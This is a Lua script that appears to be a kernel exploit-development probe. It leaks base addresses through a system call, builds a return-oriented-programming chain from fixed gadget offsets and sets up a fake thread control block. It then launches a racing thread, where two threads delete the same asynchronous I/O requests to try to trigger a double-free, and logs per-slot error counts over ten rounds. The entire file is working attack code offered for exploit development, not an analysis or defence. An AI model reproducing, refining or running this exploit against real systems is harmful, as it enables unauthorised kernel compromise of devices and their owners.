-- CRASH_CLASS: HIGH
-- PROBE 555d: diagnostic version of 555c race
--
-- 555c v3 showed: 93% child timeouts (never writes done marker),
-- 26/400 mixed results (threads interleaving!), 0 double-free detections.
-- Hypothesis: double-free IS happening but crashes the child thread.
--
-- This probe: 10 rounds, full error array dumps, long child wait,
-- partial progress detection, main error distribution.

print("=== PROBE 555d: RACE DIAGNOSTICS ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function zero(b, n) for off = 0, n - 4, 4 do wd(b + off, 0) end end
local function q(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return string.format("0x%X", N(v))
end

local Z = uint64(0)
local sc20  = mk(20)
local sc6   = mk(6)
local sc135 = mk(135)
local sc331 = mk(331)
local sc455 = mk(455)
local sc477 = mk(477)
local sc488 = mk(488)
local sc669 = mk(669)
local sc662 = mk(662)
local sc664 = mk(664)
local sc666 = mk(666)

local pid = N(sc20())
print("pid=" .. pid)

local info = memory.alloc(0x200)
zero(info, 0x200); wd(info, 0x160)
pcall(function() mk(593)(Z, info) end)
local eb = uint64(string.format("0x%X%08X", rd(info + 0x10C) or 0, rd(info + 0x108) or 0))

zero(info, 0x200); wd(info, 0x160)
pcall(function() mk(593)(uint64(0x2001), info) end)
local lk = uint64(string.format("0x%X%08X", rd(info + 0x10C) or 0, rd(info + 0x108) or 0))
print("eb=" .. q(eb) .. " lk=" .. q(lk))

local pop_rax   = eb + uint64(0x992)
local pop_rdi   = eb + uint64(0xC9DFE)
local pop_rsi   = eb + uint64(0xD77D)
local pop_rdx   = eb + uint64(0x3B02D7)
local mov_m_rax = eb + uint64(0x92C67)
local bare_ret  = eb + uint64(0x42)
local fn_addr   = lk + uint64(0xB57)

local BATCH  = 32
local ROUNDS = 10

local ok_sh, shared = pcall(function()
    return sc477(Z, uint64(0x4000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), Z)
end)
print("shared=" .. q(shared))

local ready_addr  = N(shared) + 0x000
local done_addr   = N(shared) + 0x004
local ids_addr    = N(shared) + 0x010
local child_errs  = N(shared) + 0x200
local main_errs   = N(shared) + 0x400

-- Fake TCB
local ok_tcb, tcb_page = pcall(function()
    return sc477(Z, uint64(0x4000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), Z)
end)
for i = 0, 0x100, 8 do wq(tcb_page + i, tcb_page) end
local tcb_ptr_buf = memory.alloc(8)
wq(tcb_ptr_buf, tcb_page)

-- Child ROP chain
local ok_stk, stack_base = pcall(function()
    return sc477(Z, uint64(0x200000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), Z)
end)
local stack_top = N(stack_base) + 0x100000
local rsp = stack_top - 8

local function build_chain()
    local pos = 0
    local function emit(v) wq(uint64(rsp + pos), v); pos = pos + 8 end

    emit(pop_rdi); emit(uint64(129))
    emit(pop_rsi); emit(uint64(N(tcb_ptr_buf)))
    emit(pop_rax); emit(uint64(165))
    emit(fn_addr)

    -- READY marker
    emit(pop_rax); emit(uint64(0xBEEF))
    emit(pop_rdi); emit(uint64(ready_addr))
    emit(mov_m_rax)

    -- delete
    emit(pop_rdi); emit(uint64(ids_addr))
    emit(pop_rsi); emit(uint64(BATCH))
    emit(pop_rdx); emit(uint64(child_errs))
    emit(pop_rax); emit(uint64(662))
    emit(fn_addr)

    -- done marker
    emit(pop_rax); emit(uint64(0xDEAD))
    emit(pop_rdi); emit(uint64(done_addr))
    emit(mov_m_rax)

    -- thr_exit
    emit(pop_rdi); emit(Z)
    emit(pop_rax); emit(uint64(431))
    emit(fn_addr)

    return pos
end

build_chain()

local tp = memory.alloc(0x40); zero(tp, 0x40)
wq(tp, bare_ret)
wq(tp + 0x10, stack_base)
wq(tp + 0x18, uint64(0x100008))

-- Pin main to core 0
local mask_buf = memory.alloc(8)
wq(mask_buf, uint64(1))
pcall(function()
    sc488(uint64(3), uint64(1),
        uint64(string.format("0x%X%08X", 0xFFFFFFFF, 0xFFFFFFFF)),
        uint64(8), uint64(N(mask_buf)))
end)

local sv      = memory.alloc(16)
local scratch = memory.alloc(0x1000)
local reqs    = memory.alloc(BATCH * 0x28 + 16)
local ids_tmp = memory.alloc(BATCH * 4 + 16)
local cst     = memory.alloc(BATCH * 4 + 16)
local poll_st = memory.alloc(BATCH * 4 + 16)

print(string.format("\nDiagnostic: %d rounds, batch=%d\n", ROUNDS, BATCH))

for round = 1, ROUNDS do
    print(string.format("--- ROUND %d ---", round))

    local fds_r = {}
    local fds_w = {}
    local ok_sp = true
    for i = 1, BATCH do
        local ok, v = pcall(function()
            return sc135(uint64(1), uint64(1), Z, uint64(N(sv)))
        end)
        if ok and N(v) >= 0 then
            fds_r[i] = rd(sv)
            fds_w[i] = rd(sv + 4)
        else
            ok_sp = false; break
        end
    end

    if not ok_sp then
        print("  socketpair fail")
    else
        for i = 0, BATCH - 1 do
            local base = reqs + i * 0x28
            wq(base + 0x00, Z)
            wq(base + 0x08, uint64(0x1000))
            wq(base + 0x10, uint64(N(scratch)))
            wq(base + 0x18, Z)
            wd(base + 0x20, fds_r[i + 1])
            wd(base + 0x24, 0)
        end
        for i = 0, BATCH - 1 do wd(ids_tmp + i * 4, 0) end

        pcall(function()
            sc669(uint64(0x1001), uint64(N(reqs)), uint64(BATCH),
                uint64(3), uint64(N(ids_tmp)))
        end)

        pcall(function()
            sc666(uint64(N(ids_tmp)), uint64(BATCH), uint64(N(cst)))
        end)
        for i = 1, BATCH do
            pcall(function() sc6(uint64(fds_w[i])) end)
        end

        local all_term = false
        for try = 1, 100 do
            pcall(function()
                sc664(uint64(N(ids_tmp)), uint64(BATCH), uint64(N(poll_st)))
            end)
            all_term = true
            for i = 0, BATCH - 1 do
                local s = rd(poll_st + i * 4)
                if not s or s < 3 then all_term = false; break end
            end
            if all_term then break end
        end

        if not all_term then
            print("  not terminal")
        else
            -- Print a few IDs for reference
            local id_list = {}
            for i = 0, 3 do
                id_list[#id_list + 1] = string.format("0x%X", rd(ids_tmp + i * 4) or 0)
            end
            print("  IDs: " .. table.concat(id_list, ",") .. "...")

            -- Copy IDs to shared memory
            for i = 0, BATCH - 1 do
                wd(ids_addr + i * 4, rd(ids_tmp + i * 4) or 0)
            end

            -- Clear flags + errors
            wd(ready_addr, 0)
            wd(done_addr, 0)
            for i = 0, BATCH - 1 do
                wd(child_errs + i * 4, 0x77777777)
                wd(main_errs + i * 4, 0x77777777)
            end

            -- Launch child
            pcall(function()
                sc455(uint64(N(tp)), uint64(0x38))
            end)

            -- Spin-wait for READY
            local spin = 0
            local ready = false
            for s = 1, 100000 do
                if (rd(ready_addr) or 0) == 0xBEEF then
                    ready = true; spin = s; break
                end
            end
            print("  ready=" .. tostring(ready) .. " spin=" .. spin)

            -- Main delete
            if ready then
                pcall(function()
                    sc662(uint64(ids_addr), uint64(BATCH), uint64(main_errs))
                end)
            end

            -- Wait for child with yield (much longer)
            local child_done = false
            for w = 1, 10000 do
                if (rd(done_addr) or 0) == 0xDEAD then
                    child_done = true; break
                end
                if w % 100 == 0 then
                    pcall(function() sc331() end)
                end
            end
            print("  child_done=" .. tostring(child_done))

            -- Count main error distribution
            local me_0 = 0
            local me_del = 0    -- 0x80020003 = already deleted
            local me_busy = 0   -- 0x80020010 = busy
            local me_other = 0
            local me_sent = 0   -- 0x77777777 = sentinel (never written)
            for i = 0, BATCH - 1 do
                local v = rd(main_errs + i * 4) or 0x77777777
                if v == 0 then me_0 = me_0 + 1
                elseif v == 0x80020003 then me_del = me_del + 1
                elseif v == 0x80020010 then me_busy = me_busy + 1
                elseif v == 0x77777777 then me_sent = me_sent + 1
                else me_other = me_other + 1 end
            end
            print(string.format("  main_errs: ok=%d del=%d busy=%d sent=%d other=%d",
                me_0, me_del, me_busy, me_sent, me_other))

            -- Count child error distribution
            local ce_0 = 0
            local ce_del = 0
            local ce_busy = 0
            local ce_other = 0
            local ce_sent = 0
            for i = 0, BATCH - 1 do
                local v = rd(child_errs + i * 4) or 0x77777777
                if v == 0 then ce_0 = ce_0 + 1
                elseif v == 0x80020003 then ce_del = ce_del + 1
                elseif v == 0x80020010 then ce_busy = ce_busy + 1
                elseif v == 0x77777777 then ce_sent = ce_sent + 1
                else ce_other = ce_other + 1 end
            end
            print(string.format("  child_errs: ok=%d del=%d busy=%d sent=%d other=%d",
                ce_0, ce_del, ce_busy, ce_sent, ce_other))

            -- Check for double-free (both err=0 same slot)
            local double_free = 0
            for i = 0, BATCH - 1 do
                local ce = rd(child_errs + i * 4) or 0x77777777
                local me = rd(main_errs + i * 4) or 0x77777777
                if ce == 0 and me == 0 then
                    double_free = double_free + 1
                    print(string.format("  *** SLOT %d: BOTH err=0 ***", i))
                end
            end

            -- If child timed out but has partial results, show boundary
            if not child_done and ce_sent < BATCH then
                local last_written = -1
                for i = 0, BATCH - 1 do
                    if (rd(child_errs + i * 4) or 0x77777777) ~= 0x77777777 then
                        last_written = i
                    end
                end
                print(string.format("  child partial: last_written=%d (crashed after slot %d)",
                    last_written, last_written))
            end

            print("  alive=" .. tostring(N(sc20()) == pid))
        end

        for i = 1, BATCH do
            pcall(function() sc6(uint64(fds_r[i])) end)
        end
    end
end

print("\npid_final=" .. N(sc20()))
print("=== 555d DONE ===")
